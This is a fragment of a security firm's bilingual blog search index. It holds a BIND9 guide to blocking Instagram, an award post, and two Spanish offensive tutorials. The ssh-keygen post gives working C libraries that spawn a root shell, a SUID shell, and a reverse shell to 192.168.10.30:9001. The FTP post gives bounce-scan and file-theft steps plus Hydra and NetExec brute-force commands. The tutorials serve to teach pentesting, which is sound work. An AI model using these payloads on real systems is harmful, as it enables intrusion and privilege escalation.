full control over what content is allowed or denied on our network, tailoring the DNS server to meet our specific needs.</p>"},{"location":"blog/posts/26-01-2025/#blocking-specific-domains-using-bind9","title":"Blocking specific domains using BIND9","text":""},{"location":"blog/posts/26-01-2025/#create-a-zone-file-for-blocked-domains","title":"Create a Zone File for Blocked Domains","text":"<p>To block specific domains using BIND9, you can create a custom zone file that redirects queries for those domains to an invalid or non-existent address, effectively blocking access. Here's a step-by-step guide:</p>"},{"location":"blog/posts/26-01-2025/#create-a-zone-file-for-blocked-domains_1","title":"Create a Zone File for Blocked Domains","text":"<p>A zone file defines the DNS records for the domains you want to block. These records can redirect the blocked domains to a \"blackhole\" (e.g., <code>127.0.0.1</code> or <code>0.0.0.0</code>).</p> <ol> <li>Create a new zone file for blocking domains, for example, <code>block_instagram.zone</code>:</li> </ol> <pre><code>sudo nano /etc/bind/block_instagram.zone\n</code></pre> <ol> <li>Add the following content to the zone file:</li> </ol> <pre><code>$TTL    3600\n@       IN      SOA     localhost. root.localhost. (\n                2025012601 ; Serial\n                3600       ; Refresh\n                1800       ; Retry\n                604800     ; Expire\n                86400 )    ; Minimum TTL\n        IN      NS      localhost.\n\n@       IN      A       127.0.0.1\n*       IN      A       127.0.0.1\n</code></pre> <ul> <li> <p><code>127.0.0.1</code>: Redirects queries for the blocked domains to the local machine, effectively preventing access.</p> </li> <li> <p>Wildcard Record (<code>* IN A</code>): Ensures any subdomain of the blocked domain is also redirected.</p> </li> </ul>"},{"location":"blog/posts/26-01-2025/#define-the-blocked-domains-in-namedconflocal","title":"Define the Blocked Domains in <code>named.conf.local</code>","text":"<p>We are going to block Instagram. You need to associate the blocked domains with the custom zone file.</p> <ol> <li>Open the BIND9 configuration file:</li> </ol> <pre><code>sudo nano /etc/bind/named.conf.local\n</code></pre> <ol> <li>Add a <code>zone</code> entry for each domain you want to block. In this case we will block instagram.com and cdninstagram.com, Instagram's content delivery network (CDN) domain used for serving images and videos:</li> </ol> <pre><code>zone \"instagram.com\" {\n    type master;\n    file \"/etc/bind/block_instagram.zone\";\n};\n\nzone \"cdninstagram.com\" {\n    type master;\n    file \"/etc/bind/block_instagram.zone\";\n};\n</code></pre>"},{"location":"blog/posts/26-01-2025/#reload-bind9-configuration","title":"Reload BIND9 Configuration","text":"<p>Once you\u2019ve created the zone file and updated the configuration, reload the BIND9 service to apply the changes.</p> <ol> <li> <p>Check the configuration for errors: <pre><code>sudo named-checkconf\n</code></pre></p> </li> <li> <p>Reload the BIND9 service: <pre><code>sudo systemctl reload bind9\n</code></pre></p> </li> </ol>"},{"location":"blog/posts/26-01-2025/#4-test-the-configuration","title":"4. Test the Configuration","text":"<p>To verify that the blocked domains are working as expected:</p> <ol> <li>Use the <code>dig</code> command to query the blocked domain:</li> </ol> <pre><code>dig instagram.com.\n</code></pre> <ul> <li> <p>The response should return <code>127.0.0.1</code>.</p> </li> <li> <p>Try accessing the blocked domain in a browser. It should fail to load.</p> </li> </ul> Instagram not Available <p>By creating a custom zone file and associating it with the domains you want to block, you gain full control over restricting access to specific websites. This setup allows you to:</p> <ul> <li>Enhance security by blocking known malicious domains.</li> <li>Customize the DNS server to meet your network\u2019s specific requirements. </li> </ul>"},{"location":"blog/posts/26-01-2025/#conclusion","title":"Conclusion","text":"<p>Now you\u2019ve learned how to block any domain you don\u2019t want your family or network users accessing. Whether it\u2019s limiting social media to help your kids focus, enhancing security by blocking malicious sites, or simply taking control of your network, you now have the tools to make it happen.</p> <p>This example was done on a local laptop, but it doesn\u2019t have to stop there. You can implement the same setup at the router level or use a Raspberry Pi as your primary DNS server. By doing this, you can apply these rules to your entire network, ensuring that all connected devices follow your custom restrictions.</p> <p>With this approach, you\u2019re not just managing a DNS server\u2014you\u2019re creating a safer, more productive digital environment for everyone on your network.</p> <p></p>"},{"location":"blog/posts/30-11-2024/","title":"XVIII Jornadas STIC CCN-CERT | VI Jornadas de Ciberdefensa ESPDEF-CERT","text":"<p>Last Tuesday, we had the honor of attending the XVIII Jornadas STIC CCN-CERT | VI Jornadas de Ciberdefensa ESPDEF-CERT, held at the Kin\u00e9polis cinemas in Ciudad de la Imagen, Madrid. The main purpose of this trip was to receive an award granted to our cybersecurity team, who emerged as winners of a national competition organized by the Universidad de Granada in collaboration with the El Mando Conjunto del Ciberespacio (MCCE) and the Instituto Nacional de Ciberseguridad (INCIBE). This recognition not only fills us with pride but also reinforces our commitment to new generations and our confidence in the immense talent of these young professionals.</p> <p>Moreover, we took advantage of our time at this important event to start carving out a space for ourselves in the industry, establishing connections with other companies, and learning from the experiences and advice of leading organizations in the technological landscape, both nationally and internationally.</p> <p>We are convinced that this is the right path, and we are leaving Madrid with great enthusiasm to help all the companies that place their trust in us achieve excellence.</p> <p>#XVIIIJORNADASCCNCERT #VIJORNADASESPDEFCERT</p> Our Team on the photocall"},{"location":"es/blog/","title":"Bienvenido a nuestro Blog","text":""},{"location":"es/blog/posts/26-01-2025/","title":"Configurando un DNS local","text":"<p>En este art\u00edculo, vamos a explorar qu\u00e9 es un DNS y c\u00f3mo funciona esta jerarqu\u00eda para que puedas comprender mejor su papel crucial en la navegaci\u00f3n por internet. Desde los servidores ra\u00edz que act\u00faan como el punto de partida, pasando por servidores TLD y autoritativos, llegamos al DNS local, la pieza clave que conecta todo este sistema global con tu red dom\u00e9stica o empresarial. \u00a1Prep\u00e1rate para entender c\u00f3mo puedes configurar tu propio DNS local y optimizar la navegaci\u00f3n de tu entorno! </p> <p>As\u00ed que, si quieres llevar tu conocimiento al siguiente nivel y descubrir c\u00f3mo este sistema jer\u00e1rquico garantiza que cada p\u00e1gina que visitas est\u00e9 a un clic de distancia, sigue leyendo.</p> <p>Si alguna vez te has preguntado c\u00f3mo funciona internet detr\u00e1s de escena, seguramente has escuchado hablar del DNS (Domain Name System). Este sistema es como la gu\u00eda telef\u00f3nica de la web: convierte nombres de dominio f\u00e1ciles de recordar, como www.ejemplo.com, en direcciones IP que las computadoras utilizan para conectarse entre s\u00ed. Aunque este proceso parece m\u00e1gico, es el resultado de un sistema jer\u00e1rquico cuidadosamente organizado que va desde servidores ra\u00edz hasta el nivel m\u00e1s cercano a ti: el DNS local. </p>"},{"location":"es/blog/posts/17-11-2024/","title":"Abusando de ssh-keygen","text":"<p>SSH-Keygen es una herramienta que permite crear y gestionar claves SSH, esta herramienta esta presente en la mayor\u00eda de los sistemas UNIX hoy en d\u00eda como herramienta para facilitar la gesti\u00f3n de las claves SSH.</p> <p>En este articulo exploraremos un par de m\u00e9todos para abusar de esta herramienta con ciertas configuraciones como m\u00e9todo de persistencia o de escalada de privilegios en el sistema.</p> <p>En concreto abusaremos de una funcionalidad concreta de este binario que permite la carga de claves publicas desde una librer\u00eda de lectura de tarjetas, esta opci\u00f3n es el par\u00e1metro -D, su uso es el siguiente.</p> <pre><code>ssh-keygen -D ./lib.so\n</code></pre>"},{"location":"es/blog/posts/17-11-2024/#como-generamos-el-payload","title":"Como generamos el payload","text":"<p>Una vez explicado que nos lleva a poder explotar esta funci\u00f3n, vamos a explicar en mayor detalle como generar un payload cargable, para ello primero de todo ser\u00e1 obtener una versi\u00f3n de pkcs11.h . En este archivo de cabeceras es donde se definen los tipos de datos necesarios para la funci\u00f3n de nuestra librer\u00eda que llamara ssh-keygen al usar el par\u00e1metro -D. </p> <p>En nuestro caso, para ello iremos al repositorio de Open Smart Card y descargaremos la versi\u00f3n que necesitamos de la siguiente url:</p> <p>https://github.com/OpenSC/libp11/blob/master/src/pkcs11.h</p> <p>Con este archivo procederemos a escribir un peque\u00f1o programa en C con la estructura necesaria para ser ejecutado por ssh-keygen, en nuestro caso este programa spwanea una shell en bash.</p> <pre><code>#include \"pkcs11.h\"\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \"/bin/bash\";\n        char *args[] = {cmd, NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\"fork\");\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>Una vez compilado podemos cargarlo como librer\u00eda como indicamos en la introducci\u00f3n. </p>"},{"location":"es/blog/posts/17-11-2024/#profit","title":"Profit","text":""},{"location":"es/blog/posts/17-11-2024/#caso-1-sudo-ssh-keygen","title":"Caso 1: Sudo SSH-Keygen","text":"<p>Vamos a explotar un escenario donde nuestro usuario tiene permisos para ejecutar el comando ssh-keygen como root.</p> <pre><code>Matching Defaults entries for pnavas on test:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser pnavas may run the following commands on permx:\n    (ALL : ALL) NOPASSWD: /usr/bin/ssh-keygen\n</code></pre> <p>En este ese caso, en lugar de hacer uso de una simple llamada a bash vamos a cargar una reverse shell.</p> <pre><code>#include \"pkcs11.h\"\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \"/bin/bash\";\n        char *args[] = {cmd, \"-c\" , \"bash -i &gt;&amp; /dev/tcp/192.168.10.30/9001 0&gt;&amp;1\", NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\"fork\");\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>Como resultado, al cargarla obtendremos una conexi\u00f3n como root en nuestro listener, podr\u00edamos cambiarlo para ejecutar una shell sencillamente como en el ejemplo de la secci\u00f3n de teor\u00eda </p>"},{"location":"es/blog/posts/17-11-2024/#caso-2-ssh-keygen-suid","title":"Caso 2: SSH-Keygen SUID","text":"<p>En este escenario vamos a explotar un escenario algo menos com\u00fan donde ssh-keygen tiene el bit del SUID activado, en este caso para mantener los privilegios del SUID tenemos que cambiar un poco el c\u00f3digo de la librer\u00eda para que la shell mantenga los privilegios</p> <pre><code>#include \"pkcs11.h\"\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \"/bin/bash\";\n        char *args[] = {cmd, \"-p\", NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\"fork\");\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>Una vez compilado podemos ejecutar el comando para cargar la librer\u00eda y obtener una shell con los privilegios necesarios</p>"},{"location":"es/blog/posts/24-07-2024/","title":"Introducci\u00f3n a FTP","text":"<p>El protocolo FTP (File Transfer Protocol) es un protocolo usado para la transferencia de archivos entre ordenadores en red, este protocolo presenta arquitectura cliente-servidor us\u00e1ndose un servidor para servir archivos que pueden ser accesados por N clientes. Por defecto, la informaci\u00f3n se transmite en texto plano, aunque existe una versi\u00f3n cifrada del mismo llamada SFTP (Secure File Transfer Protocol).</p> <p>Si bien existen implementaciones con interfaz gr\u00e1fica, en este art\u00edculo haremos uso de la herramienta de l\u00ednea de comandos de FTP, la cual nos da bastante flexibilidad a la hora de trabajar con el protocolo. En art\u00edculos posteriores exploraremos las principales implementaciones de cliente y servidor, aunque en este nos centraremos en explicar los conceptos b\u00e1sicos del protocolo, como trabajar con \u00e9l y como aprovechar algunas malas configuraciones.</p>"},{"location":"es/blog/posts/24-07-2024/#teoria","title":"Teor\u00eda","text":""},{"location":"es/blog/posts/24-07-2024/#canales-de-comunicacion","title":"Canales de comunicaci\u00f3n","text":"<p>Para el funcionamiento de FTP se requieren de dos canales de comunicaci\u00f3n, uno para el env\u00edo de comandos y otro para los datos.</p>"},{"location":"es/blog/posts/24-07-2024/#modos-de-conexion","title":"Modos de conexi\u00f3n","text":""},{"location":"es/blog/posts/24-07-2024/#activo","title":"Activo","text":"<p>Es el modo de conexi\u00f3n predeterminado para las conexiones FTP, en \u00e9l ocurren dos eventos:</p> <ul> <li>Se establece un canal de comandos en la conexi\u00f3n con el servidor entre el puerto de comandos del servidor (21 por defecto) y un puerto superior a 1023 en el lado cliente (nos referiremos a este como P).</li> <li>Una vez establecida la conexi\u00f3n de datos se intenta abrir una conexi\u00f3n desde el puerto de datos del servidor (20 por defecto) al puerto P+1 del cliente.</li> </ul> <p>Nota</p> <p>El modo activo puede presentar problemas con los firewalls del cliente debido a que intenta crear una conexi\u00f3n directa a un puerto del lado cliente, lo cual puede ser bloqueado por ciertos firewalls.</p>"},{"location":"es/blog/posts/24-07-2024/#pasivo","title":"Pasivo","text":"<p>Este modo surge como soluci\u00f3n al problema de los firewalls del cliente, aqu\u00ed se modifica el flujo de trabajo de modo que tanto la conexi\u00f3n de datos como la conexi\u00f3n del cliente se inician desde el cliente, podemos desglosarlo en dos eventos.</p> <ul> <li>Se establece un canal de comandos en la conexi\u00f3n con el servidor entre el puerto de comandos del servidor (21 por defecto) y un puerto superior a 1023 en el lado cliente (nos referiremos a este como P).</li> <li>Una vez establecida la conexi\u00f3n de datos se abre una conexi\u00f3n de datos desde el puerto P+1 del cliente a un puerto del canal de datos del servidor, este proceso se repite para cada transferencia de archivos ocupando un puerto distinto del servidor en cada conexi\u00f3n (esto puede ser configurado en la mayor\u00eda de los software del lado servidor) .</li> </ul> <p>Nota</p> <p>El modo pasivo requiere de la apertura de un rango de puertos en el firewall, esto puede generar algunos problemas de seguridad si esta apertura de puertos no se configura de manera correcta.</p>"},{"location":"es/blog/posts/24-07-2024/#comandos-ftp","title":"Comandos FTP","text":"<pre><code>CWD  -&gt; Cambia el directorio actual por el especificado\nDELE -&gt; Elimina el archivo especificado\nEPRT -&gt; Establecer un socket para la conexi\u00f3n de datos\nLIST -&gt; Lista los archivos en el directorio actual\nPASV -&gt; Cambia el modo a pasivo\nPWD  -&gt; Muestra el directorio actual \nRETR -&gt; Descarga el archivo especificado\n</code></pre>"},{"location":"es/blog/posts/24-07-2024/#anonymous-login","title":"Anonymous login","text":"<p>Existe una configuraci\u00f3n de FTP que permite el uso de un login para compartir ficheros para cualquier usuario que lo requiera, en caso de que esta configuraci\u00f3n este habilitada un usuario podr\u00eda usar anonymous como nombre de inicio de sesi\u00f3n y cualquier contrase\u00f1a acceder al servidor como un usuario con bajos privilegios, aunque en ciertos casos esto puede llevar a comprometer el sistema entero.</p>"},{"location":"es/blog/posts/24-07-2024/#ftp-bounce-port-scan","title":"FTP Bounce port scan","text":"<p>Es posible abusar de los comandos PORT y ERPT para realizar un escaneo de puertos abiertos mediante un servidor FTP.</p>"},{"location":"es/blog/posts/24-07-2024/#nmap","title":"Nmap","text":"<pre><code>nmap -b &lt;name&gt;:&lt;pass&gt;@&lt;ftp_server&gt; &lt;victim&gt;\n</code></pre>"},{"location":"es/blog/posts/24-07-2024/#hand-made","title":"Hand-made","text":"<p>Una vez conectado podemos realizar el escaneo de puertos mediante los comandos PORT y ERPT seguidos de un comando LIST .</p> <p>Aqu\u00ed tenemos un ejemplo para escanear el puerto 9091 del host 10.10.10.14</p> <pre><code>PORT 10,10,10,14,0,9091\nEPRT |2|10.10.10.14|9091|\n\nLIST\n</code></pre> <p>Si la respuesta es un 150 el puerto est\u00e1 abierto, en caso de recibir un 415 el puerto est\u00e1 cerrado.</p>"},{"location":"es/blog/posts/24-07-2024/#ftp-bounce-file-get","title":"FTP Bounce file get","text":"<p>Este ataque permite a un atacante descargar ficheros de un servidor FTP no accesible por el atacante, pero al que s\u00ed puede llegar un servidor FTP accesible por el atacante</p> <p></p> <p>Este ataque tiene los siguientes prerequisitos:</p> <ul> <li>Credenciales v\u00e1lidas para External FTP.</li> <li>Credenciales v\u00e1lidas para Internal FTP.</li> <li>Acceso de escritura para External FTP.</li> <li>Permisos de ejecuci\u00f3n del comando PORT tanto en External como en Internal.</li> </ul> <p>Primero que nada desplegaremos un servidor FTP en la m\u00e1quina del atacante, este servidor tiene que soportar el modo pasivo.</p> <p>Una vez desplegado abriremos una conexi\u00f3n pasiva con el comando PASV y le diremos que la guarde con STOR output.ext .</p> <p>Ahora crearemos un archivo con los comandos que queremos lanzar contra el segundo servidor, un ejemplo seria el siguiente:</p> <pre><code>user ftp   # Usuario para el servidor internal\npass password # Password para el servidor internal\ncwd /DIRECTORY\ntype i\nport F,F,F,F,X,X  #Nuestro puerto pasivo\nretr file.ext\nquit\n^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@\n^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@\n</code></pre> <p>Ahora lo subimos con PUT y desde el servidor externo ejecutamos los siguientes comandos:</p> <pre><code>put payload\nquote \"port C,C,C,C,0,21\" # IP del servidor interno\nquote \"retr payload\"\n</code></pre> <p>Tras esto tendremos el archivo file.ext en nuestro servidor como output.ext</p>"},{"location":"es/blog/posts/24-07-2024/#ataque-por-fuerza-bruta","title":"Ataque por fuerza bruta","text":"<p>Muchos de los servidores FTP no presentan protecci\u00f3n contra ataques por fuerza bruta. Teniendo un usuario o una lista de ellos podemos llevar a cabo un ataque de fuerza bruta con diferentes credenciales obtenidas de diversas fuentes, si bien existen varias herramientas para este fin, las dos m\u00e1s comunes son NetExec e Hydra. </p>"},{"location":"es/blog/posts/24-07-2024/#netexec","title":"NetExec","text":"<pre><code>nxc ftp IP -u userfile -p passwordfile\n</code></pre>"},{"location":"es/blog/posts/24-07-2024/#hydra","title":"Hydra","text":"<pre><code>hydra -L userfile -P passwordfile ftp://IP\n</code></pre>"},{"location":"es/blog/posts/24-07-2024/#backup-sorpresa","title":"Backup sorpresa","text":"<p>Esto no es un ataque per se, pero es bastante \u00fatil, ya que nos permite descargar todos los archivos accesibles del servidor mediante un solo comando.</p> <pre><code>wget -r ftp://IP/dir/* --ftp-user=username --ftp-password=password\n</code></pre>"},{"location":"es/blog/posts/24-07-2024/#ftp-file-upload-to-rce","title":"FTP file upload to RCE","text":"<p>En determinadas circunstancias, el permiso para subir ficheros al servidor junto a otras malas configuraciones puede llevar a la obtenci\u00f3n de ejecuci\u00f3n remota de comandos en el servidor.</p> <p>El caso m\u00e1s com\u00fan es la posibilidad de subir ficheros que van a ser luego servidos por un servidor web, donde podr\u00edamos subir una webshell interpretable por el servidor para lograr obtener ejecuci\u00f3n de comandos.</p>"},{"location":"es/blog/posts/24-07-2024/#sniffing-credentials","title":"Sniffing credentials","text":"<p>Dado que FTP funciona por defecto en texto plano, es posible para un atacante en la misma red usar un sniffer y capturar tanto las credenciales como la conversaci\u00f3n FTP.</p> <p>En el pr\u00f3ximo art\u00edculo de esta serie sobre FTP hablaremos sobre fallos comunes de implementaci\u00f3n y algunas vulnerabilidades conocidas de algunas implementaciones del protocolo.</p>"}]}